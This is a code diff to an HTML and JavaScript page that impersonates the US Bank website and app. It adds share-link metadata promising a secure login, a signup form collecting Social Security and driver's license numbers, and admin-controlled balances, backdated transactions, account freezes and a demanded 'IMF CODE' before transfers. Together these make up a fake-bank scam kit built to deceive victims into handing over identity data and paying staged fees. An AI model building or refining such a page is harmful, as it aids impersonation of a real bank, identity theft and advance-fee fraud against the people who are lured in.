@@ -4,6 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>US Bank</title>
+    
+    <!-- SOCIAL MEDIA SHARE META TAGS -->
+    <meta property="og:title" content="US Bank">
+    <meta property="og:description" content="Log in to your US Bank account securely.">
+    <meta property="og:image" content="https://i.ibb.co/BKLK3cr2/BF917-E7-F-55-C6-47-B5-B682-18-D0-F4958937.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="US Bank">
+    <meta name="twitter:description" content="Log in to your US Bank account securely.">
+    <meta name="twitter:image" content="https://i.ibb.co/BKLK3cr2/BF917-E7-F-55-C6-47-B5-B682-18-D0-F4958937.jpg">
+    <!-- END SOCIAL MEDIA SHARE META TAGS -->
+
     <style>
         :root {
             --usbank-red: #c8202e; 
@@ -98,21 +113,20 @@
         .login-extra-images img { width: 100%; height: auto; display: block; }
 
         .form-title { color: var(--usbank-blue); font-size: 28px; font-weight: 700; margin-bottom: 24px; }
-        .form-group { margin-bottom: 16px; }
+        .form-group { margin-bottom: 16px; position: relative; }
         .form-group label { display: block; font-size: 14px; font-weight: 600; color: #333; margin-bottom: 8px; }
         .form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
         .submit-btn { background-color: var(--action-blue); color: #ffffff; border: none; padding: 16px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 20px; }
 
         /* APP WRAPPER */
-        #app-wrapper { position: relative; flex: 1; display: flex; flex-direction: column; min-height: 100vh; background-color: var(--bg-gray); }
+        #app-wrapper { position: relative; flex: 1; display: flex; flex-direction: column; height: 100vh; overflow: hidden; background-color: var(--bg-gray); }
         .dash-header { display: flex; justify-content: space-between; align-items: center; padding: 16px; background-color: #ffffff; border-bottom: 1px solid #eee; position: sticky; top: 0; z-index: 100; }
         .dash-header-title { color: var(--usbank-blue); font-size: 18px; font-weight: 600; }
         .header-actions { display: flex; gap: 16px; align-items: center; }
         .icon-btn { width: 32px; height: 32px; display: flex; justify-content: center; align-items: center; cursor: pointer; border-radius: 50%; background-color: #f0f4f9; }
         .icon-btn svg { width: 18px; height: 18px; fill: var(--usbank-blue); }
-        .app-content { padding: 20px; flex: 1; padding-bottom: 120px; }
-
-        /* DASHBOARD */
+        .app-content { padding: 20px; flex: 1; overflow-y: auto; padding-bottom: 100px; }
+        
         .dash-date { font-size: 12px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; }
         .dash-greeting { font-size: 26px; font-weight: 700; color: var(--usbank-blue); margin-bottom: 24px; }
         .section-title { font-size: 12px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 12px; margin-top: 24px; }
@@ -129,7 +143,7 @@
         .amount-deposit { color: #22c55e !important; }
 
         /* TRANSFER & PAY */
-        .transfer-page-bg { background-color: var(--usbank-red); min-height: calc(100vh - 60px); padding-bottom: 100px; }
+        .transfer-page-bg { background-color: var(--usbank-red); height: 100%; overflow-y: auto; padding-bottom: 100px; }
         .transfer-page-header { padding: 32px 24px 20px 24px; }
         .transfer-page-title { font-size: 32px; font-weight: 400; color: #ffffff; }
         .tf-card { display: flex; align-items: center; background-color: #ffffff; padding: 24px 20px; border-radius: 16px; margin: 0 20px 16px 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); cursor: pointer; transition: transform 0.1s; }
@@ -144,7 +158,7 @@
         .tf-chevron { color: #ccc; font-size: 28px; font-weight: 300; }
 
         /* TRANSFER FORMS */
-        .form-page { background-color: #ffffff; min-height: calc(100vh - 60px); }
+        .form-page { background-color: #ffffff; height: 100%; overflow-y: auto; padding-bottom: 100px; }
         .form-page-header { padding: 20px; border-bottom: 1px solid #eee; display: flex; align-items: center; position: sticky; top: 0; background-color: #fff; z-index: 50; }
         .form-page-title { font-size: 20px; font-weight: 600; color: var(--usbank-blue); }
         .form-body { padding: 24px; }
@@ -191,7 +205,7 @@
         #frozen-overlay .btn-close { background: #d32f2f; color: white; border-radius: 30px; padding: 16px; font-size: 16px; font-weight: 600; border: none; cursor: pointer; width: 100%; }
 
         /* BOTTOM NAV */
-        .image-bottom-nav { position: absolute; bottom: 0; width: 100%; z-index: 100; background-color: #ffffff; }
+        .image-bottom-nav { position: fixed; bottom: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 414px; z-index: 100; background-color: #ffffff; }
         .image-bottom-nav img { width: 100%; display: block; }
         .nav-click-overlay { position: absolute; bottom: 0; height: 100%; cursor: pointer; z-index: 101; }
         .overlay-accounts { left: 0; width: 25%; }
@@ -211,14 +225,12 @@
 
     <div class="mobile-container">
         
-        <!-- MAIN HOME PAGE -->
         <div id="main-page">
             <header class="navbar">
                 <div class="hamburger"><span></span><span></span><span></span></div>
                 <div class="logo"><span class="logo-us">us</span><span class="logo-bank">bank</span></div>
                 <a class="login-btn" onclick="showPage('login-page')">Log in</a>
             </header>
-
             <section class="hero">
                 <div class="eyebrow">PERSONAL BANKING</div>
                 <div class="red-line"></div>
@@ -229,7 +241,6 @@
                     <button class="btn btn-secondary">Learn more</button>
                 </div>
             </section>
-
             <section class="scroll-content">
                 <img src="https://i.ibb.co/S4qVWcqV/IMG-7202.jpg" alt="Content block 1">
                 <img src="https://i.ibb.co/WNjchmkK/IMG-7188.jpg" alt="Content block 2">
@@ -247,21 +258,17 @@
             </section>
         </div>
 
-        <!-- LOGIN PAGE -->
         <div id="login-page" class="hidden">
             <header class="login-header">
                 <button class="back-btn" onclick="showPage('main-page')">&#8592;</button>
                 <div class="logo"><span class="logo-us">us</span><span class="logo-bank">bank</span></div>
             </header>
-
             <div class="form-container">
                 <div class="fdic-box">
                     <span class="fdic-logo">FDIC</span>
                     <span class="fdic-text">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
                 </div>
-
                 <h2 class="account-login-title">Account login</h2>
-
                 <form id="login-form" onsubmit="handleLogin(event)">
                     <div class="input-group">
                         <input type="text" id="login-username" placeholder="Username" required>
@@ -274,33 +281,27 @@
                         <input type="password" id="login-password" placeholder="Password" required>
                         <span class="show-toggle" onclick="togglePassword('login-password', this)">Show</span>
                     </div>
-                    
                     <button type="submit" class="btn-login-pwd">Log in with password</button>
                     <div class="divider">OR</div>
-                    <button type="button" class="btn-passkey" onclick="alert('Passkey authentication triggered!');">
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
-                        Use passkey
+                    <button type="button" class="btn-passkey" onclick="alert('Passkey auth triggered!');">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg> Use passkey
                     </button>
-
                     <a class="forgot-link" onclick="showPage('create-account-page')">Forgot username or password <span>&gt;</span></a>
                     <a class="enroll-link" href="#" onclick="showPage('create-account-page')">Enroll in online banking</a>
                 </form>
             </div>
-
             <div class="login-extra-images">
-                <img src="https://i.ibb.co/Y4vkgYNW/IMG-7208.jpg" alt="Info 2">
-                <img src="https://i.ibb.co/q3YX7s8C/IMG-7209.jpg" alt="Info 3">
-                <img src="https://i.ibb.co/Kj95Tw9j/IMG-7210.jpg" alt="Info 4">
+                <img src="https://i.ibb.co/Y4vkgYNW/IMG-7208.jpg">
+                <img src="https://i.ibb.co/q3YX7s8C/IMG-7209.jpg">
+                <img src="https://i.ibb.co/Kj95Tw9j/IMG-7210.jpg">
             </div>
         </div>
 
-        <!-- CREATE ACCOUNT PAGE -->
         <div id="create-account-page" class="hidden">
             <header class="login-header">
                 <button class="back-btn" onclick="showPage('login-page')">&#8592;</button>
                 <div class="logo"><span class="logo-us">us</span><span class="logo-bank">bank</span></div>
             </header>
-
             <div class="form-container">
                 <h2 class="form-title">Create an account</h2>
                 <form id="signup-form" onsubmit="handleSignup(event)">
@@ -311,16 +312,17 @@
                     <div class="form-group"><label>Driver's License Number</label><input type="text" id="reg-license" required></div>
                     <div class="form-group"><label>Social Security Number</label><input type="text" id="reg-ssn" required></div>
                     <div class="form-group"><label>Date of Birth</label><input type="date" id="reg-dob" required></div>
-                    <div class="form-group"><label>Password</label><input type="password" id="reg-pass" required></div>
+                    <div class="form-group">
+                        <label>Password</label>
+                        <input type="password" id="reg-pass" required>
+                        <span class="show-toggle" style="top: 38px;" onclick="togglePassword('reg-pass', this)">Show</span>
+                    </div>
                     <button type="submit" class="submit-btn">Create Account</button>
                 </form>
             </div>
         </div>
 
-        <!-- APP WRAPPER -->
         <div id="app-wrapper" class="hidden">
-            
-            <!-- DASHBOARD TAB -->
             <div id="tab-accounts">
                 <header class="dash-header">
                     <div class="hamburger"><span></span><span></span><span></span></div>
@@ -332,11 +334,9 @@
                         <div class="icon-btn" onclick="initProfile()"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
                     </div>
                 </header>
-
                 <div class="app-content">
                     <div class="dash-date" id="live-date">LOADING DATE...</div>
                     <div class="dash-greeting" id="dash-greeting">Welcome, User.</div>
-
                     <div class="section-title">CHECKING & SAVINGS</div>
                     <div class="account-card">
                         <div class="account-name" id="dash-acct-checking">Checking ...0000</div>
@@ -352,43 +352,35 @@
                 </div>
             </div>
 
-            <!-- TRANSACTION HISTORY TAB -->
             <div id="tab-history" class="hidden">
                 <header class="dash-header">
                     <button class="back-btn" onclick="switchTab('accounts')">&#8592;</button>
                     <div class="dash-header-title">Transaction History</div>
                     <div style="width: 32px;"></div> 
                 </header>
-                <div class="app-content" style="padding-bottom: 120px;">
+                <div class="app-content">
                     <div id="history-list-full"></div>
                 </div>
             </div>
 
-            <!-- TRANSFER & PAY TAB -->
             <div id="tab-pay-transfer" class="hidden">
                 <div class="transfer-page-bg">
-                    <div class="transfer-page-header">
-                        <h1 class="transfer-page-title">Transfer & Pay</h1>
-                    </div>
-
+                    <div class="transfer-page-header"><h1 class="transfer-page-title">Transfer & Pay</h1></div>
                     <div class="tf-card" onclick="openTransferForm('usbank')">
                         <div class="tf-icon-bg"><svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg></div>
                         <div class="tf-info"><h4>US Bank Accounts</h4><p>Instant internal transfer</p></div>
                         <div class="tf-chevron">&#8250;</div>
                     </div>
-
                     <div class="tf-card" onclick="openTransferForm('otherbank')">
                         <div class="tf-icon-bg"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg></div>
                         <div class="tf-info"><h4>Transfer to Other Bank</h4><p>ACH & External accounts</p></div>
                         <div class="tf-chevron">&#8250;</div>
                     </div>
-
                     <div class="tf-card" onclick="openTransferForm('zelle')">
                         <div class="tf-icon-bg zelle-icon"><svg viewBox="0 0 24 24"><path d="M7 6h10v2.5L10.5 16H17v2H7v-2.5L13.5 8H7V6z"/></svg></div>
                         <div class="tf-info"><h4>Zelle®</h4><p>Send money to friends</p></div>
                         <div class="tf-chevron">&#8250;</div>
                     </div>
-
                     <div class="tf-card" onclick="openTransferForm('wire')">
                         <div class="tf-icon-bg"><svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zm6.93 6h-2.95c-.32-1.25-.78-2.45-1.38-3.56 1.84.63 3.37 1.91 4.33 3.56zM12 4.04c.83 1.2 1.48 2.53 1.91 3.96h-3.82c.43-1.43 1.08-2.76 1.91-3.96zM4.26 14C4.1 13.36 4 12.69 4 12s.1-1.36.26-2h3.38c-.08.66-.14 1.32-.14 2 0 .68.06 1.34.14 2H4.26zm.82 2h2.95c.32 1.25.78 2.45 1.38 3.56-1.84-.63-3.37-1.9-4.33-3.56zm2.95-8H5.08c.96-1.66 2.49-2.93 4.33-3.56C8.81 5.55 8.35 6.75 8.03 8zM12 19.96c-.83-1.2-1.48-2.53-1.91-3.96h3.82c-.43 1.43-1.08 2.76-1.91 3.96zM14.34 14H9.66c-.09-.66-.16-1.32-.16-2 0-.68.07-1.35.16-2h4.68c.09.65.16 1.32.16 2 0 .68-.07 1.34-.16 2zm.25 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95c-.96 1.65-2.49 2.93-4.33 3.56zM16.36 14c.08-.66.14-1.32.14-2 0-.68-.06-1.34-.14-2h3.38c.16.64.26 1.31.26 2s-.1 1.36-.26 2h-3.38z"/></svg></div>
                         <div class="tf-info"><h4>Wire Transfer</h4><p>Domestic & International</p></div>
@@ -397,14 +389,13 @@
                 </div>
             </div>
 
-            <!-- FORMS -->
             <div id="form-usbank" class="form-page hidden">
                 <header class="form-page-header"><button class="back-btn" onclick="switchTab('pay-transfer')">&#8592;</button><div class="form-page-title">US Bank Transfer</div></header>
                 <div class="form-body">
                     <form onsubmit="handleTransferSubmit(event, 'US Bank Account')">
                         <div class="input-field"><label>From Account</label><select class="account-select" id="us-from"></select></div>
-                        <div class="input-field"><label>To Routing Number</label><input type="text" id="us-routing" required pattern="\d{9}"></div>
-                        <div class="input-field"><label>To Account Number</label><input type="text" id="us-account" required></div>
+                        <div class="input-field"><label>To Routing Number</label><input type="text" required pattern="\d{9}"></div>
+                        <div class="input-field"><label>To Account Number</label><input type="text" required></div>
                         <div class="input-field"><label>Amount ($)</label><input type="number" id="us-amount" step="0.01" min="0.01" required></div>
                         <button type="submit" class="submit-btn">Send Money</button>
                     </form>
@@ -463,25 +454,17 @@
                 </div>
             </div>
 
-            <!-- EXACT DESIGN: AUTH VERIFY MODAL (Matching Screenshot) -->
             <div id="imf-modal" class="modal-overlay hidden">
                 <div class="modal-box">
-                    <div class="auth-lock-icon">
-                        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
-                    </div>
+                    <div class="auth-lock-icon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg></div>
                     <h3>Verify Transaction</h3>
                     <p id="auth-prompt-text">Please enter your <strong>IMF CODE</strong> to proceed.</p>
-                    
-                    <div class="input-field">
-                        <input type="text" id="input-imf-code" placeholder="">
-                    </div>
-                    
+                    <div class="input-field"><input type="text" id="input-imf-code" placeholder=""></div>
                     <button class="btn-verify" onclick="verifyAuthCode()">Verify</button>
                     <button class="btn-cancel" onclick="closeIMF()">Cancel</button>
                 </div>
             </div>
 
-            <!-- RECEIPT MODAL -->
             <div id="receipt-modal" class="modal-overlay hidden">
                 <div class="modal-box">
                     <div class="logo"><span class="logo-us">us</span><span class="logo-bank">bank</span></div>
@@ -500,19 +483,15 @@
                 </div>
             </div>
 
-            <!-- EXACT DESIGN: ACCOUNT RESTRICTED MODAL (Matching Screenshot) -->
             <div id="frozen-overlay" class="modal-overlay hidden">
                 <div class="modal-box">
-                    <div class="frozen-icon">
-                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11H7v-2h10v2z"/></svg>
-                    </div>
+                    <div class="frozen-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11H7v-2h10v2z"/></svg></div>
                     <h2>Access Restricted</h2>
                     <p id="frozen-text">Account frozen, contact live chat support for more information.</p>
                     <button class="btn-close" onclick="handleLogout()">Close</button>
                 </div>
             </div>
 
-            <!-- BOTTOM NAV -->
             <div class="image-bottom-nav">
                 <img src="https://i.ibb.co/RkfzQ906/C7-C940-E6-0-B55-4-BFE-8-A56-035-EEA98-B375.jpg" alt="Bottom Navigation">
                 <div class="nav-click-overlay overlay-accounts" onclick="switchTab('accounts')"></div>
@@ -522,7 +501,6 @@
             </div>
         </div>
 
-        <!-- PROFILE PAGE -->
         <div id="profile-page" class="hidden">
             <header class="login-header">
                 <button class="back-btn" onclick="showPage('app-wrapper')">&#8592;</button>
@@ -543,9 +521,9 @@
     </div>
 
     <script>
-        let users = JSON.parse(localStorage.getItem('bank_users')) || [];
+        let users = JSON.parse(localStorage.getItem('bank_users')) || {};
         let currentUser = null;
-        let pendingTransferData = null; // Stores data while waiting for Auth Code
+        let pendingTransferData = null; 
 
         window.onload = function() {
             const rememberedUser = localStorage.getItem('remembered_username');
@@ -555,8 +533,16 @@
             }
         };
 
-        // Strict Check: If frozen/suspended, lock the app with exact wording
+        // CRITICAL: This function fetches the latest data from the Admin Panel
+        function syncData() {
+            users = JSON.parse(localStorage.getItem('bank_users')) || {};
+            if (currentUser) {
+                currentUser = users[currentUser.username]; // Update current user with latest admin changes
+            }
+        }
+
         function checkAccountStatus() {
+            if (!currentUser) return false;
             const status = currentUser.status || 'Active';
             if (status !== 'Active') {
                 document.getElementById('frozen-text').textContent = `Account ${status.toLowerCase()}, contact live chat support for more information.`;
@@ -600,10 +586,10 @@
             const pages = ['main-page', 'login-page', 'create-account-page', 'app-wrapper', 'profile-page'];
             pages.forEach(id => document.getElementById(id).classList.add('hidden'));
             document.getElementById(pageId).classList.remove('hidden');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
             
             if (pageId === 'app-wrapper') {
-                if(!checkAccountStatus()) return; // Halts if frozen
+                syncData(); // Refresh data when opening app
+                if(!checkAccountStatus()) return; 
                 initDashboard();
                 updateBalancesUI();
                 switchTab('accounts');
@@ -611,7 +597,8 @@
         }
 
         function switchTab(tabName) {
-            if(tabName !== 'accounts' && tabName !== 'history' && !checkAccountStatus()) return; 
+            syncData(); // Refresh data EVERY time a tab is clicked
+            if(!checkAccountStatus()) return; 
 
             const views = ['tab-accounts', 'tab-pay-transfer', 'tab-history', 'form-usbank', 'form-otherbank', 'form-zelle', 'form-wire'];
             views.forEach(id => document.getElementById(id).classList.add('hidden'));
@@ -624,9 +611,8 @@
                 updateBalancesUI();
             } else if (tabName === 'history') {
                 document.getElementById('tab-history').classList.remove('hidden');
-                renderTransactions();
+                renderTransactions(); // Will now show backdated transactions from admin
             }
-            window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
         function openTransferForm(type) {
@@ -638,13 +624,10 @@
             else if (type === 'otherbank') document.getElementById('form-otherbank').classList.remove('hidden');
             else if (type === 'zelle') document.getElementById('form-zelle').classList.remove('hidden');
             else if (type === 'wire') document.getElementById('form-wire').classList.remove('hidden');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // STEP 1: User submits form
         function handleTransferSubmit(event, transferTo) {
             event.preventDefault();
-            
             let amount = 0;
             let fromAccount = "";
 
@@ -655,17 +638,14 @@
 
             pendingTransferData = { to: transferTo, amount: amount, from: fromAccount };
 
-            // Check if Admin enabled Auth Code
             const authEnabled = localStorage.getItem('auth_enabled') === 'true';
             
             if (authEnabled) {
-                // Show the stylized Auth Modal
                 const authName = localStorage.getItem('auth_name') || 'IMF CODE';
                 document.getElementById('auth-prompt-text').innerHTML = `Please enter your <strong>${authName}</strong> to proceed.`;
                 document.getElementById('input-imf-code').value = '';
                 document.getElementById('imf-modal').classList.remove('hidden');
             } else {
-                // Bypass Auth and send directly
                 executeTransfer();
             }
         }
@@ -675,7 +655,6 @@
             pendingTransferData = null;
         }
 
-        // STEP 2: Verify Auth Code (If enabled)
         function verifyAuthCode() {
             const enteredCode = document.getElementById('input-imf-code').value.trim();
             const requiredCode = localStorage.getItem('auth_code') || '';
@@ -684,12 +663,10 @@
                 alert('Invalid Authorization Code. Please try again.');
                 return;
             }
-
             document.getElementById('imf-modal').classList.add('hidden');
             executeTransfer();
         }
 
-        // STEP 3: Execute the actual transfer logic
         function executeTransfer() {
             let amountVal = parseFloat(pendingTransferData.amount);
             let accountType = pendingTransferData.from;
@@ -702,9 +679,6 @@
                 currentUser.savings_bal = (parseFloat(currentUser.savings_bal) - amountVal).toFixed(2);
             }
 
-            saveUsers();
-            updateBalancesUI();
-
             const refNo = 'US' + Math.floor(10000000 + Math.random() * 90000000);
             const dateStr = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
 
@@ -714,11 +688,17 @@
             document.getElementById('receipt-ref').textContent = refNo;
             document.getElementById('receipt-date').textContent = dateStr;
 
-            currentUser.transactions.unshift({ 
+            const newTx = { 
                 type: 'Debit', from: accountType.split(' ')[0], to: pendingTransferData.to, 
                 amount: amountVal.toFixed(2), ref: refNo, date: dateStr 
-            });
+            };
+            
+            if (!currentUser.transactions) currentUser.transactions = [];
+            currentUser.transactions.unshift(newTx);
+            
+            users[currentUser.username] = currentUser;
             saveUsers();
+            updateBalancesUI();
 
             document.getElementById('receipt-modal').classList.remove('hidden');
             pendingTransferData = null;
@@ -740,11 +720,11 @@
                 currentUser.transactions.forEach(tx => {
                     const item = document.createElement('div');
                     item.className = 'transaction-item';
-                    
                     let isCredit = tx.type === 'Credit';
                     let amountClass = isCredit ? 'transaction-amount amount-deposit' : 'transaction-amount';
                     let amountPrefix = isCredit ? '+' : '-';
 
+                    // THIS DISPLAYS THE BACKDATED DATE FROM ADMIN
                     item.innerHTML = `
                         <div class="transaction-left">
                             <h5>${isCredit ? 'Deposit / Credit' : 'Transfer to'} ${tx.to}</h5>
@@ -765,44 +745,41 @@
 
         function handleSignup(event) {
             event.preventDefault(); 
-            
             const name = document.getElementById('reg-name').value;
-            const username = document.getElementById('reg-username').value;
+            const username = document.getElementById('reg-username').value.toLowerCase();
             const email = document.getElementById('reg-email').value;
             const phone = document.getElementById('reg-phone').value;
             const dob = document.getElementById('reg-dob').value;
             const password = document.getElementById('reg-pass').value;
 
-            if (users.find(u => u.username === username)) {
+            if (users[username]) {
                 alert('Username already exists. Please choose another.');
                 return;
             }
 
             const acctNum = Math.floor(1000000000 + Math.random() * 9000000000).toString();
 
-            const newUser = {
+            users[username] = {
                 name: name, username: username, password: password, email: email, phone: phone, dob: dob,
                 acctNum: acctNum, checking_bal: "0.00", savings_bal: "0.00", status: "Active", transactions: []
             };
-
-            users.push(newUser);
+            
             saveUsers();
 
-            alert(`Account Successfully Created!\nYour 10-digit Account Number is: ${acctNum}\nYou can now log in.`);
+            alert('Account Successfully Created! You can now log in.');
             document.getElementById('signup-form').reset();
             showPage('login-page');
         }
 
         function handleLogin(event) {
             event.preventDefault();
-            const enteredUser = document.getElementById('login-username').value.trim();
+            const enteredUser = document.getElementById('login-username').value.trim().toLowerCase();
             const enteredPass = document.getElementById('login-password').value;
             
-            users = JSON.parse(localStorage.getItem('bank_users')) || [];
-            const foundUser = users.find(u => u.username === enteredUser && u.password === enteredPass);
-            
-            if (foundUser) {
-                currentUser = foundUser;
+            syncData(); // Fetch latest before logging in
+
+            if (users[enteredUser] && users[enteredUser].password === enteredPass) {
+                currentUser = users[enteredUser];
                 
                 if (document.getElementById('remember').checked) {
                     localStorage.setItem('remembered_username', enteredUser);
@@ -812,7 +789,7 @@
                 
                 document.getElementById('login-form').reset();
                 
-                if (foundUser.status !== 'Active') {
+                if (currentUser.status !== 'Active') {
                     showPage('app-wrapper');
                     checkAccountStatus(); 
                 } else {
